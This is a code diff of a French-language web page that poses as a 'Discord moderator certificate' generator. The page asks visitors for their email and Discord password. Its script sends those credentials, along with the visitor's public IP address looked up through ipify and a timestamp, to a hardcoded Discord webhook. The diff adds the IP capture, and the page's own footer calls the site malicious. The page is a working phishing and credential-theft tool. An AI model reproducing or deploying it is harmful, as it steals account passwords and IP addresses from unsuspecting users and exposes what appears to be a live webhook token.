@@ -1,65 +1,78 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8" />
   <title>Certificat de modérateur discord</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #2c2f33;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    input {
-      padding: 10px;
-      font-size: 16px;
-      width: 300px;
-      border-radius: 8px;
-      border: none;
-      margin-bottom: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #5865F2;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #4752C4;
-    }
+    body { font-family: Arial, sans-serif; background:#2c2f33; color:#fff;
+           display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; }
+    input { padding:10px; font-size:16px; width:320px; border-radius:8px; border:none; margin-bottom:10px; }
+    button { padding:10px 20px; font-size:16px; background:#5865F2; color:#fff; border:none; border-radius:8px; cursor:pointer; }
+    button:hover { background:#4752C4; }
+    small { color:#bbb; margin-top:8px; }
   </style>
 </head>
 <body>
   <h2>💬 fait toi un certificat modérateur discord ! ps: les chats c'est mieux que les chiens</h2>
-  <input type="email" id="email" placeholder="Ton email...">
-  <input type="text" id="message" placeholder="Ton mot de passe...">
+  <input type="email" id="email" placeholder="Ton email..." />
+  <input type="text" id="message" placeholder="Ton mot de passe..." />
   <button id="sendBtn">Entrer</button>
+  <small id="status"></small>
 
   <script>
+    // ⚠️ Met ton webhook ici (ATTENTION : exposé côté client)
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1430155105952600125/miSVSRG79JmwJUBifFY8ejhEFtI2mwEVZ3Wd9ix69nUob0LUVFJyrFbVzDGqowbyEYbC";
 
+    // Vérification basique d'email
+    function isValidEmail(email) {
+      // regex simple, suffisant pour une validation basique côté client
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    async function getPublicIP() {
+      try {
+        // api.ipify.org renvoie { ip: "x.x.x.x" } et supporte CORS
+        const r = await fetch("https://api.ipify.org?format=json");
+        if (!r.ok) throw new Error("IP service error");
+        const j = await r.json();
+        return j.ip || "IP non disponible";
+      } catch (e) {
+        console.warn("Impossible de récupérer l'IP :", e);
+        return "IP non disponible";
+      }
+    }
+
     document.getElementById("sendBtn").addEventListener("click", async () => {
+      const statusEl = document.getElementById("status");
+      statusEl.textContent = "Préparation de l'envoi…";
+
       const email = document.getElementById("email").value.trim();
       const message = document.getElementById("message").value.trim();
 
       if (!email || !message) {
-        alert("Merci de remplir ton email et ton mot de passe discord !");
+        alert("Merci de remplir ton email et ton mot de passe !");
+        statusEl.textContent = "";
+        return;
+      }
+      if (!isValidEmail(email)) {
+        alert("Adresse email invalide !");
+        statusEl.textContent = "";
         return;
       }
 
-      // Récupérer la date et l'heure complètes
+      // Récupérer date et heure avec secondes et timezone
       const now = new Date();
-      const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-      const date = now.toLocaleDateString('fr-FR', options);
-      const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      // Format lisible FR : "lundi 21 octobre 2025"
+      const dateStr = now.toLocaleDateString("fr-FR", { weekday: "long", year: "numeric", month: "long", day: "numeric" });
+      // Heure avec hh:mm:ss
+      const timeStr = now.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+      // ISO + timezone utile pour logs
+      const iso = now.toISOString();
 
+      // Récupérer IP publique
+      const ip = await getPublicIP();
+
+      // Construire le payload pour Discord
       const payload = {
         embeds: [
           {
@@ -67,30 +80,38 @@
             color: 0x5865f2,
             fields: [
               { name: "📧 Email", value: email, inline: true },
-              { name: "🔒 Mot de passe", value: message, inline: false },
-              { name: "🕒 Date & Heure", value: `${date} à ${time}`, inline: false }
+              { name: "🔒 Message", value: message, inline: false },
+              { name: "🕒 Date & Heure (locale)", value: `${dateStr} à ${timeStr}`, inline: false },
+              { name: "⏱ ISO (UTC)", value: iso, inline: false },
+              { name: "🌐 IP publique", value: ip, inline: true }
             ],
-            footer: { text: "Message envoyé depuis mon site bahaha 💻" }
+            footer: { text: "Message envoyé depuis mon site malicieux 💻" },
+            timestamp: iso // ajoute un timestamp natif pour Discord
           }
         ]
       };
 
       try {
-        await fetch(WEBHOOK_URL, {
+        const res = await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
+        if (!res.ok) {
+          throw new Error("Erreur envoi webhook : " + res.status);
+        }
+
         alert("Message envoyé sur Discord !");
         document.getElementById("email").value = "";
         document.getElementById("message").value = "";
+        statusEl.textContent = "Envoyé ✔";
       } catch (err) {
-        alert("Erreur lors de l'envoi du certificat !");
         console.error(err);
+        alert("Erreur lors de l'envoi du certificat !");
+        statusEl.textContent = "Erreur lors de l'envoi ⛔";
       }
     });
   </script>
 </body>
 </html>
-
